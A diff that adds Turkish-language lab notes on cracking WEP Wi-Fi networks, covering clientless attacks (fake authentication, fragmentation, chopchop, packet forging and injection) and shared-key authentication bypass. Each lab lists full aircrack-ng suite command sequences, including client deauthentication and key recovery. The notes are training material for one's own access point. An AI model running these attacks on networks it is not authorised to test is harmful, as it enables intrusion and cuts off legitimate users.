@@ -110,3 +110,147 @@ Aircrack-ng'yi çalışan yakalamanıza karşı çalıştırın ve AP'lerinizin 
 denemeler yapın.
 
 # aircrack-ng -z -n 64 <capture>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### 9. Cracking Clientless WEP Networks ###
+
+9.2.1 Attack Setup Lab 
+
+AP'nizi WEP şifrelemesi için açık kimlik doğrulama ile yapılandırın ve kablosuz kurbanınızın ağa bağlı olmadığından emin olun.
+
+- Kablosuz kartınızı AP kanalındaki izleme moduna yerleştirin ve yakalamayı diske kaydederek bir Airodump-ng oturumu başlatın.
+- Seçtiğiniz yeniden ilişkilendirme zamanlamasıyla AP'nize karşı sahte kimlik doğrulama saldırısı çalıştırın.
+
+# airmon-ng start <interface> <AP channel> 
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
+# aireplay-ng -1 6000 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
+
+
+--------
+
+
+9.3.4 Fragmentation Attack Lab 
+
+Henüz yapmadıysanız, AP'nizi WEP şifreleme ve açık kimlik doğrulama ile ayarlayın. Erişim noktasına bağlı istemcinizin olmadığından emin olun.
+Aireplay-ng'yi şu amaçlarla kullanın:
+
+- AP için sahte kimlik doğrulama (henüz yapmadıysanız)
+- PRGA XOR dosyası oluşturmak için parçalanma saldırısını kullanın. Bu dosyayı daha sonra kullanmak üzere kaydedin.
+
+# airmon-ng start <interface> <AP channel> 
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
+# aireplay-ng -1 6000 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
+# aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface> 
+
+
+--------
+
+
+9.4.3 Packetforge-ng Lab 
+
+Parçalanma saldırısını çalıştırırken edindiğiniz PRGA XOR dosyasını kullanarak:
+
+- Bir ARP istek paketi oluşturmak için Packetforge-ng'yi kullanın
+- Paketinizin doğru şekilde oluşturulduğunu doğrulamak için tcpdump ve Airdecap-ng kullanın
+- Farklı Packetforge-ng seçeneklerini deneyin ve bunlara aşina olun
+- Hazırlanmış paketinizi kablosuz ağa enjekte etmek için etkileşimli paket tekrar saldırısı olan Aireplay'in saldırısı 2'yi kullanın.
+
+# packetforge-ng -0 -a <AP MAC> -h <Source MAC> -l <Source IP> -k <Dest IP> -y <PRGA filename> -w <output filename> 
+# tcpdump -n -vvv -e -s0 -r arp-request
+# airdecap-ng -e wifu -w aabbccddee arp-request 
+# tcpdump -n -vvv -e -s0 -r arp-request-dec
+# aireplay-ng -2 -r <packet filename> <interface> 
+	
+
+----------
+
+
+9.5.4 KoreK ChopChop Attack Lab 
+
+AP'nizin açık kimlik doğrulama, WEP şifreleme ile yapılandırıldığından ve bağlı istemciler olmadığından emin olun.
+
+- AP'nize karşı KoreK Chopchop saldırısı olan Run attack 4
+- Packetforge-ng kullanarak bir ARP paketi oluşturmak için ortaya çıkan anahtar akışı dosyasını kullanın
+
+# aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface> 
+# packetforge-ng -0 -a $AP -h $MON -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-1110-163209.xor -w arp-korek
+
+
+----------
+
+9.7 Clientless WEP Cracking Lab 
+
+Erişim noktanızı açık kimlik doğrulama ve WEP şifreleme ile yapılandırın (bu sefer anahtarı değiştirmeyi deneyin) ve bağlı istemci olmadığından emin olun. Kablosuz 
+kartınızı AP kanalındaki monitör moduna yerleştirin ve bir Airodump çekimi başlatın.
+
+- AP'ye karşı sahte bir kimlik doğrulama saldırısı başlatın
+- PRGA anahtar akışını elde etmek için KoreK Chopchop saldırısı olan attack 4'ü çalıştırın
+- Packetforge-ng kullanarak bir ARP paketi oluşturun ve bunu ağa enjekte edin
+- Saldırı 5'i, parçalanma saldırısını başlatın ve anahtar akışını kurtarın
+- Packetforge-ng ile bir ARP paketi oluşturun ve bunu ağa enjekte edin
+- AP'nizin WEP anahtarını kurtarmak için Aircrack-ng kullanın
+
+
+# airmon-ng start <interface> <AP channel> 
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
+# aireplay-ng -1 6000 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
+# aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface> 
+# packetforge-ng -0 -a <AP MAC> -h <Source MAC> -l <Source IP> -k <Dest IP> -y <PRGA filename> -w <output filename> 
+# aireplay-ng -2 -r <packet filename> <interface> 
+# aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface> 
+# packetforge-ng -0 -a <AP MAC> -h <Source MAC> -l <Source IP> -k <Dest IP> -y <PRGA filename> -w <output filename>
+# aireplay-ng -2 -r <packet filename> <interface> 
+# aircrack-ng wepnoclients-01.cap 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+### 10. Bypassing WEP Shared Key Authentication ###
+
+10.2.1 Attack Setup Lab 
+
+Paylaşılan anahtar kimlik doğrulaması ile WEP şifrelemesi için AP'nizi yapılandırın. Kablosuz kurbanınızı paylaşılan WEP anahtarını kullanarak ağa yeniden bağlayın.
+
+- Kablosuz kartınızı izleme moduna getirin ve yakalamayı diske kaydederek bir Airodump yakalama işlemi başlatın.
+- AP'ye karşı sahte kimlik doğrulama saldırısı gerçekleştirmeye çalışın, böylece başarısız olduğunda ortaya çıkan hatayı fark edersiniz.
+
+# airmon-ng start wlan0 3 
+# airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w wepshared mon0 
+# aireplay-ng -1 0 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface> 
+
+
+---------
+
+
+10.3.4 Shared Key Fake Authentication Lab 
+
+AP'nizin WEP paylaşılan anahtar kimlik doğrulaması ile yapılandırıldığından ve kendisiyle ilişkilendirilmiş bir istemciye sahip olduğundan emin olun.
+Aireplay-ng'yi şu amaçlarla kullanın:
+
+- Kurban kablosuz istemcinin kimlik doğrulamasını kaldırın
+- PRGA XOR dosyasını tanımlayın ve AP ile sahte kimlik doğrulaması yapmak için kullanın
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface> 
+# aireplay-ng -1 0 -e <ESSID> -y <anahtar akışı dosyası> -a <AP MAC> -h <MAC'niz> <arayüz>
+
+
+----------
+
+
+10.5 Bypassing WEP Shared Key Authentication Lab 
+
+AP'nizin, paylaşılan anahtar kimlik doğrulaması kullanılarak WEP şifrelemeyle yapılandırıldığından emin olun. Kurban istemcinizi kablosuz ağa bağlayın ve kablosuz 
+kartınızı AP kanalındaki monitör moduna yerleştirmeyi hatırlayarak bir Airodump yakalama işlemi başlatın.
+
+- XOR anahtar akışını kurtarmak için bağlı istemcinin kimlik doğrulamasını kaldırın
+- Sahte bir paylaşılan anahtar kimlik doğrulama saldırısı gerçekleştirmek için anahtar akışı dosyasını kullanın
+- ARP isteği yeniden oynatma saldırısını başlatın ve bir ARP paketi oluşturmaya zorlamak için istemcinin kimlik doğrulamasını tekrar kaldırın
+- Aircrack-ng kullanarak WEP şifrenizi kırın
+
+# aireplay-ng -0 1 -a <AP MAC> -c <İstemci MAC> <arayüz> 
+# aireplay-ng -1 0 -e <ESSID> -y <anahtar akışı dosyası> -a <AP MAC> -h <MAC'niz> <arayüz>
+# aireplay-ng -3 -b <AP MAC> -h <MAC'iniz> <arayüz>
+# aircrack-ng <capture>
+
